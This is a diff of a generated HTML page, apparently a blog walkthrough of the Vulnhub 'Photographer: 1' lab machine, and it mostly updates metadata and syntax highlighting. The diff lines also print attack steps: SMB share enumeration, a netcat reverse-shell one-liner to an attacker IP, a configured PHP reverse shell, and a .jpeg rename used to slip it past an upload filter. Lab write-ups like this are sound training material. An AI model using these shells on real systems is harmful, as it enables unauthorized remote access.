@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="generator" content="Hugo 0.85.0 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Tiago Tavares">
-<meta name="keywords" content="vulnhub">
+<meta name="keywords" content="vulnhub, cybersecurity, information security, running, hacking, programming, offensive security, red team">
 <meta name="description" content="Photographer: 1 - A Vulnhub vulnerable machine walkthrough.">
 
 
@@ -49,10 +49,10 @@
 
 <meta name="twitter:card" content="summary">
 
-  <meta name="twitter:site" content="@tiagotavares_">
+  <meta name="twitter:site" content="@0xtiago">
 
 
-  <meta name="twitter:creator" content="@tiagotavares_">
+  <meta name="twitter:creator" content="@0xtiago">
 
 
 
@@ -103,7 +103,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     
     
   </head>
@@ -201,7 +200,7 @@ if (!doNotTrack) {
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://github.com/tiagotvrs" target="_blank" rel="noopener">
+      <a class="sidebar-button-link " href="https://github.com/0xtiago" target="_blank" rel="noopener">
     
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
@@ -350,8 +349,8 @@ Host script results:
 | smb-os-discovery: 
 |   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
 |   Computer name: photographer
-|   NetBIOS computer name: PHOTOGRAPHER<span style="color:#ae81ff">\x</span>00
-|   Domain name: <span style="color:#ae81ff">\x</span>00
+|   NetBIOS computer name: PHOTOGRAPHER<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
 |   FQDN: photographer
 |_  System time: 2020-07-30T12:59:52-04:00
 | smb-security-mode: 
@@ -424,7 +423,7 @@ Host script results:
 |   <span style="color:#ae81ff">\\</span>192.168.210.130<span style="color:#ae81ff">\I</span>PC$: 
 |     Type: STYPE_IPC_HIDDEN
 |     Comment: IPC Service <span style="color:#f92672">(</span>photographer server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
-|     Users: 2
+|     Users: <span style="color:#ae81ff">2</span>
 |     Max Users: &lt;unlimited&gt;
 |     Path: C:<span style="color:#ae81ff">\t</span>mp
 |     Anonymous access: READ/WRITE
@@ -432,7 +431,7 @@ Host script results:
 |   <span style="color:#ae81ff">\\</span>192.168.210.130<span style="color:#ae81ff">\p</span>rint$: 
 |     Type: STYPE_DISKTREE
 |     Comment: Printer Drivers
-|     Users: 0
+|     Users: <span style="color:#ae81ff">0</span>
 |     Max Users: &lt;unlimited&gt;
 |     Path: C:<span style="color:#ae81ff">\v</span>ar<span style="color:#ae81ff">\l</span>ib<span style="color:#ae81ff">\s</span>amba<span style="color:#ae81ff">\p</span>rinters
 |     Anonymous access: &lt;none&gt;
@@ -440,7 +439,7 @@ Host script results:
 |   <span style="color:#ae81ff">\\</span>192.168.210.130<span style="color:#ae81ff">\s</span>ambashare: 
 |     Type: STYPE_DISKTREE
 |     Comment: Samba on Ubuntu
-|     Users: 0
+|     Users: <span style="color:#ae81ff">0</span>
 |     Max Users: &lt;unlimited&gt;
 |     Path: C:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\a</span>gi<span style="color:#ae81ff">\s</span>hare
 |     Anonymous access: READ/WRITE
@@ -451,10 +450,10 @@ Host script results:
 Enter WORKGROUP<span style="color:#ae81ff">\g</span>uest<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
 smb: <span style="color:#ae81ff">\&gt;</span> ls
-  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:30:07 2020
-  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">21</span> 06:44:25 2020
-  mailsent.txt                        N      <span style="color:#ae81ff">503</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:29:40 2020
-  wordpress.bkp.zip                   N <span style="color:#ae81ff">13930308</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:22:23 2020
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:30:07 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">21</span> 06:44:25 <span style="color:#ae81ff">2020</span>
+  mailsent.txt                        N      <span style="color:#ae81ff">503</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:29:40 <span style="color:#ae81ff">2020</span>
+  wordpress.bkp.zip                   N <span style="color:#ae81ff">13930308</span>  Mon Jul <span style="color:#ae81ff">20</span> 22:22:23 <span style="color:#ae81ff">2020</span>
 
 		<span style="color:#ae81ff">278627392</span> blocks of size 1024. <span style="color:#ae81ff">264268400</span> blocks available
 smb: <span style="color:#ae81ff">\&gt;</span>
@@ -480,7 +479,7 @@ Downloaded 13.29MB in <span style="color:#ae81ff">2</span> seconds
 <p>Let me get the IP.</p>
 <p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1596208912/blog/image-20200730160504724_pigddu.png" alt="image-20200730160504724"></p>
 <p>In Kali:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp 1234
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp <span style="color:#ae81ff">1234</span>
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rm -f /tmp/pipe ; mkfifo /tmp/pipe ; cat /tmp/pipe | /bin/bash -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.210.129 <span style="color:#ae81ff">1234</span> &gt; /tmp/pipe
 </code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1596208912/blog/image-20200730162944141_crvw2b.png" alt="image-20200730162944141"></p>
 <p>Received shell from machine</p>
@@ -492,21 +491,21 @@ Downloaded 13.29MB in <span style="color:#ae81ff">2</span> seconds
 <p><a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">vim php-reverse-shell.php
 </code></pre></div><p>Change the IP and port (if necessary).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">...
-set_time_limit (0);
-$VERSION = &#34;1.0&#34;;
-$ip = &#39;192.168.210.129&#39;;  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
-$daemon = 0;
-$debug = 0;
-...
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...</span>
+<span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.210.129&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;       <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
+$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#f92672">...</span>
 </code></pre></div><p>Now we are going to upload some malicious content.</p>
 <p>Let&rsquo;s prepare our attacker machine to receive the connection.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp 1234
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp <span style="color:#ae81ff">1234</span>
 </code></pre></div><p>Now, make a copy of php adding an extention .jpeg.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp php-reverse-shell.php php-reverse-shell.php.jpeg
 </code></pre></div><p>Time to upload the malicious payload.</p>
@@ -635,7 +634,7 @@ $debug = 0;
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2020 Tiago Tavares. All Rights Reserved
+    &copy; 2021 Tiago Tavares. All Rights Reserved
   </span>
 </footer>
 
